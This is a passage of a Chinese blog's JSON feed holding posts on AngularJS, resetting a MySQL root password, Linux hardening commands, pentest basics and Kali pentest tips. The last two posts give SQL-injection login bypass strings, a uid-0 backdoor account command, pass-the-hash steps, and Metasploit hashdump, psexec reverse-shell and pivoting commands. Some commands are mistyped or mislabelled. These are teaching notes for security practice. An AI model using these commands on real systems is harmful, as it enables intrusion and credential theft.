<span>ng-app</span><span><span>=</span><span>\"</span>MyModule<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>div</span> <span>ng-controller</span><span><span>=</span><span>\"</span>MyCtrl<span>\"</span></span><span>></span></span>\n      <span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>text<span>\"</span></span> <span>ng-model</span><span><span>=</span><span>\"</span>message<span>\"</span></span> <span>/></span></span>\n      <span><span><span>&lt;</span>h1</span><span>></span></span>{{ message }}<span><span><span>&lt;/</span>h1</span><span>></span></span>\n    <span><span><span>&lt;/</span>div</span><span>></span></span>\n\n    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>https://cdn.bootcss.com/angular.js/1.7.8/angular.min.js<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n    <span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n      <span>// 这边使用到的是推断型依赖注入</span>\n      <span>const</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>\"MyModule\"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>\n\n      <span>const</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>\n        $scope<span>.</span>message <span>=</span> <span>\"Hello world !!!\"</span><span>;</span>\n      <span>}</span><span>;</span>\n\n      MyModule<span>.</span><span>controller</span><span>(</span><span>\"MyCtrl\"</span><span>,</span> MyCtrl<span>)</span><span>;</span>\n    </span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n  <span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2019-04-01T16:44:20.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "other"
      ]
    },
    {
      "title": "更新 MySQL root 的密码",
      "url": "https://vxhly.github.io/views/other/update-mysql-root-password.html",
      "id": "https://vxhly.github.io/views/other/update-mysql-root-password.html",
      "summary": "前言\n最近在 ubuntu 系统上安装了 MySQL, 但是安装时没有提示输入 root 用户密码, 网上胡乱找了一通, 这才知道 MySQL 5.7 以上版本的 root 密码都是随机生成的, 所以这里提供解决 MySQL 5.7 版本的 root 用户重置密码问题。\n\n",
      "content_html": "<div><p>前言</p>\n<p>最近在 ubuntu 系统上安装了 MySQL, 但是安装时没有提示输入 root 用户密码, 网上胡乱找了一通, 这才知道 MySQL 5.7 以上版本的 root 密码都是随机生成的, 所以这里提供解决 MySQL 5.7 版本的 root 用户重置密码问题。</p>\n</div>\n\n<h2 id=\"安装-mysql\" tabindex=\"-1\"> 安装 MySQL</h2>\n<div><pre><code><span>apt-get</span> <span>install</span> mysql-cilent mysql-server 解决MySQL <span>5.7</span>版本的root用户重置密码问题\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>安装之后可以使用下面的命令来检查是否安装成功</p>\n<div><pre><code><span>sudo</span> <span>netstat</span> -tap <span>|</span> <span>grep</span> mysql\n<span>netstat</span> -tap <span>|</span> <span>grep</span> mysql\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"登录-mysql\" tabindex=\"-1\"> 登录 MySQL</h2>\n<div><pre><code>mysql -u root -p\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输入密码, 如果可以进入则下面的不用看了；如果提示不能登入, 则我们尝试启用安全模式登入 MySQL, 这样可以绕过密码登入, 登入后再修改密码。</p>\n<h2 id=\"修改密码\" tabindex=\"-1\"> 修改密码</h2>\n<h3 id=\"修改配置文件\" tabindex=\"-1\"> 修改配置文件</h3>\n<p><code>my.cnf</code> =&gt; 不同系统的配置文件名以及存放路径不一致, 但一定能在 <code>/etc/mysql</code> 里找到</p>\n<p>在 [mysqld] 小节下添加一行, 这一行配置让 mysqld 启动时不对密码进行验证</p>\n<div><pre><code>[mysqld]\nskip - grant - tables = 1\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>修改完成之后保存重启 MySQL 服务</p>\n<div><pre><code>/etc/init.d/mysql restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"无密码登录-mysql-修改密码\" tabindex=\"-1\"> 无密码登录 MySQL 修改密码</h3>\n<div><pre><code>mysql -u root -p\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>执行以下操作</p>\n<div><pre><code>mysql<span>></span> use mysql<span>;</span>\n mysql<span>></span> update user <span>set</span> <span>authentication_string</span><span>=</span>PASSWORD<span>(</span><span>\"这里输入你要改的密码\"</span><span>)</span> where <span>User</span><span>=</span><span>'root'</span><span>;</span><span>#更改密码</span>\n mysql<span>></span> update user <span>set</span> <span>plugin</span><span>=</span><span>\"mysql_native_password\"</span><span>;</span><span>#如果没这一行可能也会报一个错误,因此需要运行这一行</span>\n mysql<span>></span> flush privileges<span>;</span><span>#更新所有操作权限</span>\n mysql<span>></span> quit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"完成配置重启\" tabindex=\"-1\"> 完成配置重启</h3>\n<p>删掉或者注释 <code>skip-grant-tables=1</code> 该行配置</p>\n<p>修改完成之后保存重启 MySQL 服务</p>\n<div><pre><code>/etc/init.d/mysql restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>之后使用设置的密码登录即可</p>\n<div><pre><code>mysql -u root -p\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"附上完全卸载-mysql-命令\" tabindex=\"-1\"> 附上完全卸载 MySQL 命令</h2>\n<div><pre><code><span>apt-get</span> autoremove mysql-*\n dpkg -l <span>|</span><span>grep</span> ^rc<span>|</span><span>awk</span> <span>'{print $2}'</span> <span>|</span><span>sudo</span> <span>xargs</span> dpkg -P\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div>",
      "date_published": "2018-09-06T19:19:17.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "other"
      ]
    },
    {
      "title": "Liunx 安全加固命令集合",
      "url": "https://vxhly.github.io/views/pentest/liunx-security-command.html",
      "id": "https://vxhly.github.io/views/pentest/liunx-security-command.html",
      "summary": "前言\n收集 Liunx 系统安全加固时, 发现系统漏洞, 修复系统, 加固系统信息等命令集合。\n\n",
      "content_html": "<div><p>前言</p>\n<p>收集 Liunx 系统安全加固时, 发现系统漏洞, 修复系统, 加固系统信息等命令集合。</p>\n</div>\n\n<h2 id=\"find\" tabindex=\"-1\"> find</h2>\n<div><pre><code><span># 使用 uid 查找对应的程序</span>\n<span>find</span> / -uid <span>0</span> -perm -4000\n\n<span># 查找哪里拥有写权限</span>\n<span>find</span> / -perm -o<span>=</span>w\n\n<span># 查找名称中包含点和空格的文件</span>\n<span>find</span> / -name <span>\" \"</span> -print\n<span>find</span> / -name <span>\"..\"</span> -print\n<span>find</span> / -name <span>\". \"</span> -print\n<span>find</span> / -name <span>\" \"</span> -print\n\n<span># 查找不属于任何人的文件</span>\n<span>find</span> / -nouser\n\n<span># 查找那些文件包含指定文本内容</span>\n<span>find</span> / -iname <span>\"*\"</span> <span>|</span> xrags <span>grep</span> <span>\"[String]\"</span>\n\n<span># 查找一小时内新增的文件</span>\n<span>find</span> / -cmin -60\n\n<span># 查找所有不可修改的文件</span>\n<span>find</span> <span>.</span> <span>|</span> <span>xargs</span> -I <span>file</span> lsattr -a <span>file</span> <span><span>2</span>></span>/dev/null <span>|</span> <span>grep</span> ‘^….i’\n\n<span># 查找 SUID root 文件</span>\n<span>find</span> / -user root -perm -4000 -print\n\n<span># 查找 SGID root 文件:</span>\n<span>find</span> / -group root -perm -2000 -print\n\n<span># 查找 SUID 和 SGID 文件:</span>\n<span>find</span> / -perm -4000 -o -perm -2000 -print\n\n<span># 查找不属于任何用户的文件:</span>\n<span>find</span> / -nouser -print\n\n<span># 查找不属于任何用户组的文件:</span>\n<span>find</span> / -nogroup -print\n\n<span># 查找软连接及其指向:</span>\n<span>find</span> / -type l -ls\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"lsof\" tabindex=\"-1\"> lsof</h2>\n<div><pre><code><span># 查找未链接的文件</span>\n<span>lsof</span> +L1\n\n<span># 获取进程打开端口的信息</span>\n<span>lsof</span> -i\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"arp\" tabindex=\"-1\"> arp</h2>\n<div><pre><code><span># 看看 ARP 表中是否有奇怪的东西</span>\narp -a\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"getent\" tabindex=\"-1\"> getent</h2>\n<div><pre><code><span># 查看所有账户</span>\ngetent <span>passwd</span>\n\n<span># 查看所有用户组</span>\ngetent group\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"chattr\" tabindex=\"-1\"> chattr</h2>\n<div><pre><code><span># 使文件不可修改</span>\nchattr -i fileKK\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div>",
      "date_published": "2017-05-20T14:22:42.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "渗透基础知识",
      "url": "https://vxhly.github.io/views/pentest/pentest-basic-knowledge.html",
      "id": "https://vxhly.github.io/views/pentest/pentest-basic-knowledge.html",
      "summary": "前言\n整理的渗透所需的一些基础知识。\n\n",
      "content_html": "<div><p>前言</p>\n<p>整理的渗透所需的一些基础知识。</p>\n</div>\n\n<h2 id=\"html-表单基础\" tabindex=\"-1\"> HTML 表单基础</h2>\n<ol>\n<li>该表单是提交给哪个文件进行处理的（查看 action 属性值）</li>\n<li>向后端程序提交的参数是什么（查看 name 属性）</li>\n</ol>\n<h2 id=\"sql-数据库查询语句基础\" tabindex=\"-1\"> SQL 数据库查询语句基础</h2>\n<ol>\n<li>查询返回所有的结果</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"2\">\n<li>条件查询</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span><span>'$uname'</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"3\">\n<li>union 合并多个查询结果</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>union</span> <span>select</span> <span>*</span> <span>from</span> msgs<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol>\n<li>... ...</li>\n</ol>\n<h2 id=\"万能用户名或者万能密码\" tabindex=\"-1\"> 万能用户名或者万能密码</h2>\n<ol>\n<li>第一种</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span><span>''</span> <span>or</span> <span>''</span><span>=</span><span>''</span> <span>and</span> passwd<span>=</span>$passwd<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"2\">\n<li>第二种</li>\n</ol>\n<div><pre><code><span>select</span> _from users <span>where</span> uame<span>=</span><span>''</span> <span>union</span> select_ <span>from</span> users <span>and</span> passwd<span>=</span>$passwd<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"3\">\n<li>第三种</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span>$uname <span>and</span> passwd<span>=</span><span>''</span> <span>or</span> <span>''</span><span>=</span><span>''</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"4\">\n<li>... ...</li>\n</ol>\n<h2 id=\"使用-pdo-进行防注入基础\" tabindex=\"-1\"> 使用 PDO 进行防注入基础</h2>\n<ol>\n<li>允许长连接</li>\n</ol>\n<div><pre><code><span>PDO</span><span>::</span><span>ATTR_PERSISTENT</span><span>=></span><span>true</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"2\">\n<li>不允许使用预处理语句</li>\n</ol>\n<div><pre><code><span>PDO</span><span>::</span><span>ATTR_EMULATE_PREPARE</span><span>=></span><span>false</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"3\">\n<li>PDO 连接</li>\n</ol>\n<div><pre><code><span>$pdh</span><span>=</span><span>new</span> <span>PDO</span><span>(</span>host<span>=</span><span>'127.0.0.1:1433'</span><span>,</span>user<span>=</span><span>'sa'</span><span>,</span>password<span>=</span><span>'root'</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"4\">\n<li>预处理 SQL 查询语句</li>\n</ol>\n<div><pre><code><span>$stmt</span><span>=</span><span>$dbh</span><span>-></span><span>prepare</span><span>(</span><span>$sql</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"5\">\n<li>填充 SQL 语句中的占位符</li>\n</ol>\n<div><pre><code><span>$stmt</span><span>-></span><span>execute</span><span>(</span><span>array</span><span>(</span><span>...</span><span>,</span><span>...</span><span>,</span><span>...</span><span>.</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"6\">\n<li>SQL 占位符（如: select * from users where uname=? and passwd=?; ）</li>\n</ol>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uname<span>=</span>? <span>and</span> passwd<span>=</span>?<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"7\">\n<li>... ...</li>\n</ol>\n<h2 id=\"wireshark-抓包\" tabindex=\"-1\"> Wireshark 抓包</h2>\n<ol>\n<li>熟练使用 <strong>Wireshark</strong> 这款软件</li>\n<li>熟练掌握过滤器的写法（如: <code>tcp</code> 、 <code>udp</code> 、 <code>icmp</code> 、 <code>mac</code> ......）</li>\n<li>知道各个协议的包结构、包头、包尾</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"审查代码的能力\" tabindex=\"-1\"> 审查代码的能力</h2>\n<ol>\n<li><strong>HTML</strong> 源文件内容（通过右键网页 –&gt; 查看源文件）</li>\n<li><strong>PHP</strong> 代码（了解代码逻辑以及书写规范, 特别是对函数名的记忆）</li>\n<li><strong>PYTHON</strong> 代码（快速读懂代码意思, 特别是要从 main 函数入手去查看）</li>\n<li><strong>C</strong> 语言代码（从代码中分析出来, 该代码的意思以及各个函数的逻辑）</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"各个-web-漏洞的利用能力\" tabindex=\"-1\"> 各个 WEB 漏洞的利用能力</h2>\n<ol>\n<li><strong>SQL</strong> 注入（通过万能用户名和万能密码来获取一定的 webshell）</li>\n<li>命令注入（特别是 PHP 中的 exec 和 system 函数也能获取到一定的 webshell）</li>\n<li>文件包含和目录遍历（通过 <code>../../../../... .../flag.txt</code> 来获取文件）</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"liunx-服务的安全配置\" tabindex=\"-1\"> Liunx 服务的安全配置</h2>\n<ol>\n<li><strong>SSH</strong>（禁止 root 登录；禁止空密码登录；禁止密钥登录 ... ...）</li>\n<li><strong>TELNET</strong>（禁止 root telnet；禁用 telnet ... ...）</li>\n<li><strong>VSFTP</strong>（不允许普通用户登录 ftp；禁止匿名用户登录 ftp ... ...）</li>\n<li><strong>HTTPD</strong>（禁止回显 banner 信息；严格控制目录权限 ... ...）</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"php-安全配置\" tabindex=\"-1\"> PHP 安全配置</h2>\n<ol>\n<li>开启安全模式</li>\n</ol>\n<div><pre><code>safe_mode <span>=</span> on\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol>\n<li>禁用函数</li>\n</ol>\n<div><pre><code>disable_functions <span>=</span> system,exec,eval,shell_exec,phpinfo,<span>..</span>. <span>..</span>.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol>\n<li>禁止 SQL 注入</li>\n</ol>\n<div><pre><code>magic_quotes_gpc <span>=</span> On\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"python-渗透脚本基础\" tabindex=\"-1\"> PYTHON 渗透脚本基础</h2>\n<ol>\n<li>了解 scapy 这一模块（特别是在构造数据包的时候该怎么写）</li>\n<li>了解 dpkt 封装或者拆解网络协议包</li>\n<li>了解 socket 编程</li>\n<li>能够从 help 这一帮助函数中获取到其他函数的使用方法</li>\n<li>拥有快速阅读脚本的能力和代码逻辑思维</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"liunx-常用命令\" tabindex=\"-1\"> Liunx 常用命令</h2>\n<ol>\n<li><strong>find</strong></li>\n</ol>\n<div><pre><code><span>find</span>  /  -iname  * <span>|</span> <span>xargs</span>  <span>grep</span>  –i  <span>'*key*'</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"2\">\n<li>grep</li>\n</ol>\n<div><pre><code><span>grep</span>  <span>'*key*'</span>  ./keystring.txt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"3\">\n<li>netstat</li>\n</ol>\n<div><pre><code><span>netstat</span> –tulnp <span>11.4</span> <span>kill</span> -9 <span>[</span>pid<span>]</span> <span>11.5</span> chattr +i /etc/passwd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"4\">\n<li>kill</li>\n</ol>\n<div><pre><code><span>kill</span> -9 <span>[</span>pid<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"5\">\n<li>chattr</li>\n</ol>\n<div><pre><code>chattr  +i  /etc/passwd /etc/shadow\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"6\">\n<li>useradd</li>\n</ol>\n<div><pre><code><span>useradd</span>  -o  -u  <span>0</span>  <span>test</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"web-漏洞训练平台\" tabindex=\"-1\"> WEB 漏洞训练平台</h2>\n<p>1.<strong>DVWA</strong> 【<a href=\"https://github.com/ethicalhack3r/DVWA\" target=\"_blank\" rel=\"noopener noreferrer\">DVWA</a>】 2.<strong>Web For Pentester</strong> 【<a href=\"https://pentesterlab.com/exercises/web_for_pentester_II\" target=\"_blank\" rel=\"noopener noreferrer\">Web For Pentester II</a>】(请自行安装镜像, 安装时请选择&quot;其他 Liunx 3.x 内核 64 位&quot;) 3.<strong>ZVulDrill</strong> 【<a href=\"https://github.com/710leo/ZVulDrill\" target=\"_blank\" rel=\"noopener noreferrer\">ZVulDrill</a>】(请自行准备 PHP 环境)</p>\n<ol start=\"4\">\n<li>... ...</li>\n</ol>\n<h2 id=\"网络协议原理\" tabindex=\"-1\"> 网络协议原理</h2>\n<ol>\n<li><strong>Tcp</strong> 三次握手和四次挥手</li>\n<li><strong>Icmp</strong> 发包以及回包</li>\n<li><strong>Mac</strong> 防洪原理</li>\n<li><strong>ARP</strong> 发广播包, <strong>ARP</strong> 欺骗</li>\n<li><strong>Dtp</strong> 生成树攻击原理</li>\n<li>... ...</li>\n</ol>\n<h2 id=\"关于-python-的网络渗透编程\" tabindex=\"-1\"> 关于 PYTHON 的网络渗透编程</h2>\n<ol>\n<li>ARP 扫描</li>\n</ol>\n<div><pre><code><span>import</span> socket\n<span># or</span>\n<span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><ol start=\"2\">\n<li>ARP 欺骗、ARP 监控</li>\n</ol>\n<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"3\">\n<li>OS 扫描</li>\n</ol>\n<div><pre><code><span>import</span> nmap\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"4\">\n<li>Mac 防洪</li>\n</ol>\n<div><pre><code><span>import</span> socket\n<span># or</span>\n<span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><ol start=\"5\">\n<li>mssql 数据库密码爆破</li>\n</ol>\n<div><pre><code><span>import</span> pymssql\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"6\">\n<li>跨越 VlAN 攻击</li>\n</ol>\n<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"7\">\n<li>Dtp 攻击</li>\n</ol>\n<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ol start=\"8\">\n<li>... ...</li>\n</ol>\n",
      "date_published": "2017-09-03T19:54:18.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "kali 下渗透测试的一些小技巧",
      "url": "https://vxhly.github.io/views/pentest/pentest-tips-and-tricks.html",
      "id": "https://vxhly.github.io/views/pentest/pentest-tips-and-tricks.html",
      "summary": "前言\n总结在渗透测试上的一些小技巧, 基本上都是 kali 下的一些常用的工具使用集合。\n\n",
      "content_html": "<div><p>前言</p>\n<p>总结在渗透测试上的一些小技巧, 基本上都是 kali 下的一些常用的工具使用集合。</p>\n</div>\n\n<h2 id=\"dirb\" tabindex=\"-1\"> DIRB</h2>\n<h3 id=\"使用-dirb-爆破目录\" tabindex=\"-1\"> 使用 DIRB 爆破目录</h3>\n<p>注: <a href=\"http://dirb.sourceforge.net/\" target=\"_blank\" rel=\"noopener noreferrer\">DIRB</a> 是一个专门用于爆破目录的工具, 在 Kali 中默认已经安装, 类似工具还有国外的 <a href=\"http://github.com/lanjelot/patator\" target=\"_blank\" rel=\"noopener noreferrer\">patator</a>, <a href=\"http://github.com/maurosoria/dirsearch\" target=\"_blank\" rel=\"noopener noreferrer\">dirsearch</a>, [DirBuster](http://www.owasp.org/index.php/Category: OWASP_DirBuster_Project), 国内的御剑等等。</p>\n<div><pre><code>dirb http://<span>[</span>IP<span>]</span>:PORT /usr/share/dirb/wordlists/common.txt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"niko\" tabindex=\"-1\"> Niko</h2>\n<h3 id=\"使用-nikto-扫描-web-服务\" tabindex=\"-1\"> 使用 Nikto 扫描 Web 服务</h3>\n<div><pre><code>nikto -C all -h http://<span>[</span>IP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"wpscan\" tabindex=\"-1\"> wpscan</h2>\n<h3 id=\"使用-wpscan-扫描-wordpress\" tabindex=\"-1\"> 使用 wpscan 扫描 WordPress</h3>\n<div><pre><code><span>git</span> clone https://github.com/wpscanteam/wpscan.git <span>&amp;&amp;</span> <span>cd</span> wpscan\n./wpscan –url <span>&lt;</span>http:http://<span>[</span>IP<span>]</span>/<span>></span> –enumerate p\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"httprint\" tabindex=\"-1\"> httprint</h2>\n<h3 id=\"使用-httprint-进行-http-指纹识别\" tabindex=\"-1\"> 使用 httprint 进行 HTTP 指纹识别</h3>\n<div><pre><code><span>wget</span> //www.net-square.com/_assets/httprint_linux_301.zip <span>&amp;&amp;</span> <span>unzip</span> httprint_linux_301.zip\n<span>cd</span> httprint_301/linux/\n./httprint -h http://<span>[</span>IP<span>]</span> -s signatures.txt\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"skipfish\" tabindex=\"-1\"> Skipfish</h2>\n<h3 id=\"使用-skipfish-进行-web-应用安全\" tabindex=\"-1\"> 使用 Skipfish 进行 Web 应用安全</h3>\n<p>注: Skipfish 是一款 Web 应用安全侦查工具, Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图, 最终生成的地图会在通过安全检查后输出。</p>\n<div><pre><code>skipfish -m <span>5</span> -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://<span>[</span>IP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"nc\" tabindex=\"-1\"> nc</h2>\n<h3 id=\"使用-nc-进行扫描\" tabindex=\"-1\"> 使用 nc 进行扫描</h3>\n<div><pre><code><span>nc</span> -v -w <span>1</span> target -z <span>1</span>-1000\n<span>for</span> <span>i</span> <span>in</span> <span>{</span><span>101</span><span>..</span><span>102</span><span>}</span><span>;</span><span>do</span> <span>nc</span> -vv -n -w <span>1</span> <span>192.168</span>.56.<span>$i</span> <span>21</span>-25 -z<span>;</span><span>done</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"us\" tabindex=\"-1\"> us</h2>\n<h3 id=\"使用-unicornscan-进行信息收集和安全审计\" tabindex=\"-1\"> 使用 Unicornscan 进行信息收集和安全审计</h3>\n<div><pre><code>us -H -msf -Iv <span>192.168</span>.56.101 -p <span>1</span>-65535\nus -H -mU -Iv <span>192.168</span>.56.101 -p <span>1</span>-65535\n\n<span># -H 在生成报告阶段解析主机名</span>\n<span># -m 扫描类型 (sf - tcp, U - udp)</span>\n<span># -Iv - 详细</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"xprobe2\" tabindex=\"-1\"> Xprobe2</h2>\n<h3 id=\"使用-xprobe2-识别操作系统指纹\" tabindex=\"-1\"> 使用 Xprobe2 识别操作系统指纹</h3>\n<div><pre><code>xprobe2 -v -p tcp:80:open IP\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"meterpreter\" tabindex=\"-1\"> Meterpreter</h2>\n<h3 id=\"使用-meterpreter-进行端口转发\" tabindex=\"-1\"> 使用 Meterpreter 进行端口转发</h3>\n<div><pre><code><span># //www.offensive-security.com/metasploit-unleashed/portfwd/</span>\n<span># 转发远程端口到目标地址</span>\n\nmeterpreter <span>></span> portfwd <span>add</span> –l <span>3389</span> –p <span>3389</span> –r <span>172.16</span>.194.141\nkali <span>></span> rdesktop <span>127.0</span>.0.1:3389\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"使用-meterpreter-获取哈希值\" tabindex=\"-1\"> 使用 Meterpreter 获取哈希值</h3>\n<div><pre><code><span>git</span> clone https://github.com/byt3bl33d3r/pth-toolkit\npth-winexe -U <span>hash</span> http://<span>[</span>IP<span>]</span> cmd\n\n<span># 或者</span>\n\n<span>apt-get</span> <span>install</span> freerdp-x11\nxfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP\n\n<span># 在或者</span>\n\nmeterpreter <span>></span> run post/windows/gather/hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nmsf <span>></span> use exploit/windows/smb/psexec\nmsf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> payload windows/meterpreter/reverse_tcp\nmsf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit<span>(</span>psexec<span>)</span> <span>></span> exploit\nmeterpreter <span>></span> shell\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"使用-hashcat-破解密码\" tabindex=\"-1\"> 使用 Hashcat 破解密码</h4>\n<div><pre><code>hashcat -m <span>400</span> -a <span>0</span> <span>hash</span> /root/rockyou.txt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"使用-metasploit-进行穿透\" tabindex=\"-1\"> 使用 metasploit 进行穿透</h3>\n<div><pre><code>route <span>add</span> X.X.X.X <span>255.255</span>.255.0 <span>1</span>\nuse auxiliary/server/socks4a\nrun\nproxychains msfcli windows/* <span>PAYLOAD</span><span>=</span>windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span>IP <span>LPORT</span><span>=</span><span>443</span> <span>RHOST</span><span>=</span>IP E\n\n<span>#或者</span>\n\n<span># //www.offensive-security.com/metasploit-unleashed/pivoting/</span>\nmeterpreter <span>></span> ipconfig\nIP Address  <span>:</span> <span>10.1</span>.13.3\nmeterpreter <span>></span> run autoroute -s <span>10.1</span>.13.0/24\nmeterpreter <span>></span> run autoroute -p\n<span>10.1</span>.13.0          <span>255.255</span>.255.0      Session <span>1</span>\nmeterpreter <span>></span> Ctrl+Z\nmsf auxiliary<span>(</span>tcp<span>)</span> <span>></span> use exploit/windows/smb/psexec\nmsf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> RHOST <span>10.1</span>.13.2\nmsf exploit<span>(</span>psexec<span>)</span> <span>></span> exploit\nmeterpreter <span>></span> ipconfig\nIP Address  <span>:</span> <span>10.1</span>.13.2\n</code></pre><div 